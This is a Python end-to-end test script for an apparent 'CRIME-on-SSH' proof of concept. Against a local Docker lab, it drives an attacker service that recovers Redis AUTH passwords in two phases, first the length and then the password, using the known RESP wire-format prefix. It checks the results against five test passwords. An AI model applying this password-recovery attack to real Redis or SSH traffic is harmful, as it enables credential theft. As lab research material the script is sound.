"""End-to-end attack test against several known Redis passwords.

Run from the host while the docker-compose stack is up:

    python scripts/test_attack.py

The attack works in two phases per password, mirroring the RESP wire
format that redis-py sends for ``AUTH default <password>``:

    *3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$<len>\r\n<password>\r\n

Phase 1 -- recover the password length digit(s) using the constant
RESP prefix up to the ``$`` before the length.

Phase 2 -- recover the password itself using the full prefix including
the recovered length and the ``\r\n`` delimiter.
"""

from __future__ import annotations

import json
import sys
import time
import urllib.error
import urllib.request

ATTACKER_BASE = "http://127.0.0.1:9000"
CLIENT_BASE = "http://127.0.0.1:8000"

# Constant RESP prefix before the password length byte(s).
RESP_PREFIX = "*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$"
PW_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789"
LEN_ALPHABET = "0123456789"

TEST_SECRETS = [
    "hunter2",
    "correcthorse",
    "pa55word",
    "letmein9",
    "tr0ub4dor",
]


def http(method: str, url: str, body: bytes | None = None,
         content_type: str | None = None, timeout: float = 1800.0) -> dict:
    headers = {}
    if content_type:
        headers["Content-Type"] = content_type
    req = urllib.request.Request(url, method=method, data=body, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read()
    if not raw:
        return {}
    return json.loads(raw)


def set_secret(value: str) -> None:
    body = json.dumps({"value": value}).encode("utf-8")
    http("POST", f"{CLIENT_BASE}/set_secret", body=body,
         content_type="application/json")


def run_attack(known_prefix: str, alphabet: str, max_length: int) -> dict:
    body = json.dumps({
        "known_prefix": known_prefix,
        "alphabet": alphabet,
        "max_length": max_length,
    }).encode("utf-8")
    return http("POST", f"{ATTACKER_BASE}/run_attack", body=body,
                content_type="application/json")


def recover_password(secret_len_hint: int) -> tuple[str, float]:
    """Two-phase RESP attack: recover length, then password."""
    t0 = time.time()

    # Phase 1: recover the password length (digits before \r)
    result1 = run_attack(
        known_prefix=RESP_PREFIX,
        alphabet=LEN_ALPHABET,
        max_length=4,  # up to 999-char passwords
    )
    pw_len_str = result1["recovered"]
    pw_len = int(pw_len_str)
    print(f"    phase 1: RESP password length = {pw_len} "
          f"({result1['elapsed_seconds']:.1f}s)")

    # Phase 2: recover the password itself
    phase2_prefix = RESP_PREFIX + pw_len_str + "\r\n"
    result2 = run_attack(
        known_prefix=phase2_prefix,
        alphabet=PW_ALPHABET,
        max_length=pw_len + 4,
    )
    password = result2["recovered"]
    elapsed = time.time() - t0
    print(f"    phase 2: password = {password!r} "
          f"({result2['elapsed_seconds']:.1f}s)")

    return password, elapsed


def main() -> int:
    print("CRIME-on-SSH PoC: end-to-end attack test (Redis AUTH, RESP wire format)")
    print(f"RESP prefix: {RESP_PREFIX!r}")
    print(f"Test secrets: {TEST_SECRETS}")
    print()

    results = []
    for idx, secret in enumerate(TEST_SECRETS, 1):
        print("=" * 72)
        print(f"  [{idx}/{len(TEST_SECRETS)}] target Redis password = {secret!r}")
        print("=" * 72)
        set_secret(secret)
        time.sleep(2.0)

        recovered, elapsed = recover_password(len(secret))
        ok = recovered == secret
        status = "PASS" if ok else "FAIL"

        print(f"    recovered: {recovered!r}")
        print(f"    expected:  {secret!r}")
        print(f"    total:     {elapsed:.1f}s")
        print(f"    status:    {status}")
        print()
        results.append((secret, recovered, ok, elapsed))

    print("=" * 72)
    print("  SUMMARY")
    print("=" * 72)
    print(f"  {'expected':<16} {'recovered':<16} {'time':<10} status")
    print(f"  {'-'*16} {'-'*16} {'-'*10} ------")
    for secret, recovered, ok, elapsed in results:
        status = "PASS" if ok else "FAIL"
        print(f"  {secret:<16} {recovered:<16} {elapsed:>6.1f}s    {status}")

    n_pass = sum(1 for _, _, ok, _ in results if ok)
    print()
    print(f"  {n_pass}/{len(results)} tests passed")
    return 0 if n_pass == len(results) else 1


if __name__ == "__main__":
    sys.exit(main())
